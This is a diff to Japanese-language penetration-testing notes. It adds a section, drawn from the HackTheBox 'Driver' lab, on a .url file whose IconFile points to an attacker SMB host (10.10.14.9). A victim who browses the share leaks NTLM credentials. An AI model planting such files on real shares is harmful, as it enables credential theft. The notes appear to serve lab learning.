@@ -267,8 +267,24 @@
   Command=ToggleDesktop
   ```
 
+##  url file
+
+* ターゲットがurlファイルの存在するsmb共有ディレクトリにアクセスした際、urlファイル内で指定された攻撃者サーバにntlmでアクセス
+
+* Htb: Driver
+
+  ```console
+  ┌─[rio@parrot]─[~/Htb/Driver]
+  └──╼ $cat trigger.url
+  [InternetShortcut]
+  URL=whatever
+  WorkingDirectory=whatever
+  IconFile=\\10.10.14.9\lnk
+  IconIndex=1
+  ```
 
 ## Tips  
+
   | Command | 説明                       |
   | ------- | -------------------------- |
   | dir /q  | ファイルのオーナを表示する |
